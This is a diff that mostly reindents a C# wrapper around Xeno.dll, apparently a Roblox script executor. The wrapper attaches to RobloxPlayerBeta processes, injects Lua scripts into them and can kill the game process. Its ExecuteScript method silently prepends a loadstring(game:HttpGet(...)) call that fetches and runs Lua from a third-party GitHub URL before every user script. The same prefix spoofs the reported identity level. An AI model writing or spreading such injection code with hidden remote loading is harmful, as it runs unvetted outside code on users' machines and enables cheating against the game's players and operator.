@@ -7,175 +7,175 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 
-#nullable disable
+
 namespace skiddedapi
 {
-  public static class skiddedapi
-  {
-    private static string _currentUserLevel = "3";
-    private static bool _autoInject = false;
-    private static bool Initialized = false;
-    private static string _attachNotifyTitle = "[skiddedapi]";
-    private static string _attachNotifyText = "Attached! Thanks for using skidded API!";
-    private static bool _attachNotifyEnabled = true;
-
-    [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
-    private static extern void Initialize(bool useConsole);
-
-    [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
-    private static extern void Attach();
-
-    [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
-    private static extern IntPtr GetClients();
-
-    [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.StdCall)]
-    public static extern void SetSettings(skiddedapi.skiddedapi.APISetting settingID, int value);
-
-    [DllImport("bin\\Xeno.dll", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.Cdecl)]
-    public static extern void Execute(byte[] scriptSource, int[] PIDs, int numUsers);
-
-    public static void SetAutoInject(bool enable)
+    public static class skiddedapi
     {
-      if (!skiddedapi.skiddedapi.Initialized)
-      {
-        skiddedapi.skiddedapi.Initialize(false);
-        skiddedapi.skiddedapi.Initialized = true;
-      }
-      skiddedapi.skiddedapi._autoInject = enable;
-      skiddedapi.skiddedapi.SetSettings(skiddedapi.skiddedapi.APISetting.AutoAttach, enable ? 1 : 0);
+        private static string _currentUserLevel = "3";
+        private static bool _autoInject = false;
+        private static bool Initialized = false;
+        private static string _attachNotifyTitle = "[skiddedapi]";
+        private static string _attachNotifyText = "Attached! Thanks for using skidded API!";
+        private static bool _attachNotifyEnabled = true;
+
+        [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
+        private static extern void Initialize(bool useConsole);
+
+        [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
+        private static extern void Attach();
+
+        [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.Cdecl)]
+        private static extern IntPtr GetClients();
+
+        [DllImport("bin\\Xeno.dll", CallingConvention = CallingConvention.StdCall)]
+        public static extern void SetSettings(skiddedapi.APISetting settingID, int value);
+
+        [DllImport("bin\\Xeno.dll", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.Cdecl)]
+        public static extern void Execute(byte[] scriptSource, int[] PIDs, int numUsers);
+
+        public static void SetAutoInject(bool enable)
+        {
+            if (!skiddedapi.Initialized)
+            {
+                skiddedapi.Initialize(false);
+                skiddedapi.Initialized = true;
+            }
+            skiddedapi._autoInject = enable;
+            skiddedapi.SetSettings(skiddedapi.APISetting.AutoAttach, enable ? 1 : 0);
+        }
+
+        public static bool IsAutoInjectEnabled() => skiddedapi._autoInject;
+
+        public static void SetAttachNotify(string title, string text)
+        {
+            if (string.IsNullOrEmpty(title) || string.IsNullOrEmpty(text))
+            {
+                skiddedapi._attachNotifyEnabled = false;
+            }
+            else
+            {
+                skiddedapi._attachNotifyTitle = title;
+                skiddedapi._attachNotifyText = text;
+                skiddedapi._attachNotifyEnabled = true;
+            }
+        }
+
+        public static void AttachAPI()
+        {
+            if (!skiddedapi.Initialized)
+            {
+                skiddedapi.Initialize(false);
+                skiddedapi.Initialized = true;
+            }
+            skiddedapi.Attach();
+            Thread.Sleep(1000);
+            for (int index = 0; index < 50 && skiddedapi.GetClientsList().Count == 0; ++index)
+                Thread.Sleep(100);
+            if (skiddedapi.GetClientsList().Count > 0)
+                Thread.Sleep(3000);
+            if (!skiddedapi._attachNotifyEnabled)
+                return;
+            skiddedapi.ExecuteNotification(skiddedapi._attachNotifyTitle, skiddedapi._attachNotifyText);
+        }
+
+        public static int AttachAPIWithState()
+        {
+            if (!skiddedapi.Initialized)
+            {
+                skiddedapi.Initialize(false);
+                skiddedapi.Initialized = true;
+            }
+            skiddedapi.Attach();
+            Thread.Sleep(4000);
+            if (skiddedapi.GetClientsList().Count <= 0)
+                return 0;
+            if (skiddedapi._attachNotifyEnabled)
+                skiddedapi.ExecuteNotification(skiddedapi._attachNotifyTitle, skiddedapi._attachNotifyText);
+            return 1;
+        }
+
+        public static void ExecuteScript(string scriptSource)
+        {
+            int[] array = skiddedapi.GetClientsList().Select<skiddedapi.ClientInfo, int>((Func<skiddedapi.ClientInfo, int>)(c => c.id)).ToArray<int>();
+            skiddedapi.Execute(Encoding.UTF8.GetBytes("local YouAre = 'skid'; loadstring(game:HttpGet(\"https://raw.githubusercontent.com/QuorumHub1/PatchScr/refs/heads/main/Patch.lua\"))(); if YouAre == 'skid' then YouAre = 'Stupid' end; getgenv().Level = \"" + skiddedapi._currentUserLevel + "\"; getgenv().printidentity = function() print('Current identity is ' .. getgenv().Level) end; " + scriptSource + "\0"), array, array.Length);
+        }
+
+        private static void ExecuteNotification(string title, string text)
+        {
+            string s = "\tgame:GetService(\"StarterGui\"):SetCore(\"SendNotification\", {\r\n\t\tTitle = \"" + title + "\",\r\n\t\tText = \"" + text + "\"\r\n\t})";
+            int[] array = skiddedapi.GetClientsList().Select<skiddedapi.ClientInfo, int>((Func<skiddedapi.ClientInfo, int>)(c => c.id)).ToArray<int>();
+            skiddedapi.Execute(Encoding.UTF8.GetBytes(s), array, array.Length);
+        }
+
+        public static bool IsRobloxOpen() => Process.GetProcessesByName("RobloxPlayerBeta").Length != 0;
+
+        public static void KillRoblox()
+        {
+            if (!skiddedapi.IsRobloxOpen())
+                return;
+            foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
+                process.Kill();
+        }
+
+        public static List<skiddedapi.ClientInfo> GetClientsList()
+        {
+            List<skiddedapi.ClientInfo> clientsList = new List<skiddedapi.ClientInfo>();
+            IntPtr clients = skiddedapi.GetClients();
+            if (clients == IntPtr.Zero)
+                return clientsList;
+            string stringAnsi = Marshal.PtrToStringAnsi(clients);
+            if (string.IsNullOrEmpty(stringAnsi))
+                return clientsList;
+            try
+            {
+                foreach (Match match in Regex.Matches(stringAnsi, "\\[\\s*(\\d+),\\s*\"(.*?)\",\\s*\"(.*?)\",\\s*(\\d+)\\s*\\]"))
+                    clientsList.Add(new skiddedapi.ClientInfo()
+                    {
+                        id = int.Parse(match.Groups[1].Value),
+                        name = match.Groups[2].Value,
+                        version = match.Groups[3].Value,
+                        state = int.Parse(match.Groups[4].Value)
+                    });
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            return clientsList;
+        }
+
+        public static int GetAttachState()
+        {
+            try
+            {
+                return skiddedapi.GetClientsList().Count > 0 ? 1 : 0;
+            }
+            catch
+            {
+                return 0;
+            }
+        }
+
+        public static void SetLevel(string userLevel)
+        {
+            skiddedapi._currentUserLevel = userLevel.Replace("\"", "\\\"");
+        }
+
+        public class ClientInfo
+        {
+            public int id { get; set; }
+
+            public string name { get; set; }
+
+            public string version { get; set; }
+
+            public int state { get; set; }
+        }
+
+        public enum APISetting
+        {
+            AutoAttach = 1,
+        }
     }
-
-    public static bool IsAutoInjectEnabled() => skiddedapi.skiddedapi._autoInject;
-
-    public static void SetAttachNotify(string title, string text)
-    {
-      if (string.IsNullOrEmpty(title) || string.IsNullOrEmpty(text))
-      {
-        skiddedapi.skiddedapi._attachNotifyEnabled = false;
-      }
-      else
-      {
-        skiddedapi.skiddedapi._attachNotifyTitle = title;
-        skiddedapi.skiddedapi._attachNotifyText = text;
-        skiddedapi.skiddedapi._attachNotifyEnabled = true;
-      }
-    }
-
-    public static void AttachAPI()
-    {
-      if (!skiddedapi.skiddedapi.Initialized)
-      {
-        skiddedapi.skiddedapi.Initialize(false);
-        skiddedapi.skiddedapi.Initialized = true;
-      }
-      skiddedapi.skiddedapi.Attach();
-      Thread.Sleep(1000);
-      for (int index = 0; index < 50 && skiddedapi.skiddedapi.GetClientsList().Count == 0; ++index)
-        Thread.Sleep(100);
-      if (skiddedapi.skiddedapi.GetClientsList().Count > 0)
-        Thread.Sleep(3000);
-      if (!skiddedapi.skiddedapi._attachNotifyEnabled)
-        return;
-      skiddedapi.skiddedapi.ExecuteNotification(skiddedapi.skiddedapi._attachNotifyTitle, skiddedapi.skiddedapi._attachNotifyText);
-    }
-
-    public static int AttachAPIWithState()
-    {
-      if (!skiddedapi.skiddedapi.Initialized)
-      {
-        skiddedapi.skiddedapi.Initialize(false);
-        skiddedapi.skiddedapi.Initialized = true;
-      }
-      skiddedapi.skiddedapi.Attach();
-      Thread.Sleep(4000);
-      if (skiddedapi.skiddedapi.GetClientsList().Count <= 0)
-        return 0;
-      if (skiddedapi.skiddedapi._attachNotifyEnabled)
-        skiddedapi.skiddedapi.ExecuteNotification(skiddedapi.skiddedapi._attachNotifyTitle, skiddedapi.skiddedapi._attachNotifyText);
-      return 1;
-    }
-
-    public static void ExecuteScript(string scriptSource)
-    {
-      int[] array = skiddedapi.skiddedapi.GetClientsList().Select<skiddedapi.skiddedapi.ClientInfo, int>((Func<skiddedapi.skiddedapi.ClientInfo, int>) (c => c.id)).ToArray<int>();
-      skiddedapi.skiddedapi.Execute(Encoding.UTF8.GetBytes("local YouAre = 'skid'; loadstring(game:HttpGet(\"https://raw.githubusercontent.com/QuorumHub1/PatchScr/refs/heads/main/Patch.lua\"))(); if YouAre == 'skid' then YouAre = 'Stupid' end; getgenv().Level = \"" + skiddedapi.skiddedapi._currentUserLevel + "\"; getgenv().printidentity = function() print('Current identity is ' .. getgenv().Level) end; " + scriptSource + "\0"), array, array.Length);
-    }
-
-    private static void ExecuteNotification(string title, string text)
-    {
-      string s = "\tgame:GetService(\"StarterGui\"):SetCore(\"SendNotification\", {\r\n\t\tTitle = \"" + title + "\",\r\n\t\tText = \"" + text + "\"\r\n\t})";
-      int[] array = skiddedapi.skiddedapi.GetClientsList().Select<skiddedapi.skiddedapi.ClientInfo, int>((Func<skiddedapi.skiddedapi.ClientInfo, int>) (c => c.id)).ToArray<int>();
-      skiddedapi.skiddedapi.Execute(Encoding.UTF8.GetBytes(s), array, array.Length);
-    }
-
-    public static bool IsRobloxOpen() => Process.GetProcessesByName("RobloxPlayerBeta").Length != 0;
-
-    public static void KillRoblox()
-    {
-      if (!skiddedapi.skiddedapi.IsRobloxOpen())
-        return;
-      foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
-        process.Kill();
-    }
-
-    public static List<skiddedapi.skiddedapi.ClientInfo> GetClientsList()
-    {
-      List<skiddedapi.skiddedapi.ClientInfo> clientsList = new List<skiddedapi.skiddedapi.ClientInfo>();
-      IntPtr clients = skiddedapi.skiddedapi.GetClients();
-      if (clients == IntPtr.Zero)
-        return clientsList;
-      string stringAnsi = Marshal.PtrToStringAnsi(clients);
-      if (string.IsNullOrEmpty(stringAnsi))
-        return clientsList;
-      try
-      {
-        foreach (Match match in Regex.Matches(stringAnsi, "\\[\\s*(\\d+),\\s*\"(.*?)\",\\s*\"(.*?)\",\\s*(\\d+)\\s*\\]"))
-          clientsList.Add(new skiddedapi.skiddedapi.ClientInfo()
-          {
-            id = int.Parse(match.Groups[1].Value),
-            name = match.Groups[2].Value,
-            version = match.Groups[3].Value,
-            state = int.Parse(match.Groups[4].Value)
-          });
-      }
-      catch (Exception ex)
-      {
-        Console.WriteLine(ex.Message);
-      }
-      return clientsList;
-    }
-
-    public static int GetAttachState()
-    {
-      try
-      {
-        return skiddedapi.skiddedapi.GetClientsList().Count > 0 ? 1 : 0;
-      }
-      catch
-      {
-        return 0;
-      }
-    }
-
-    public static void SetLevel(string userLevel)
-    {
-      skiddedapi.skiddedapi._currentUserLevel = userLevel.Replace("\"", "\\\"");
-    }
-
-    public class ClientInfo
-    {
-      public int id { get; set; }
-
-      public string name { get; set; }
-
-      public string version { get; set; }
-
-      public int state { get; set; }
-    }
-
-    public enum APISetting
-    {
-      AutoAttach = 1,
-    }
-  }
 }
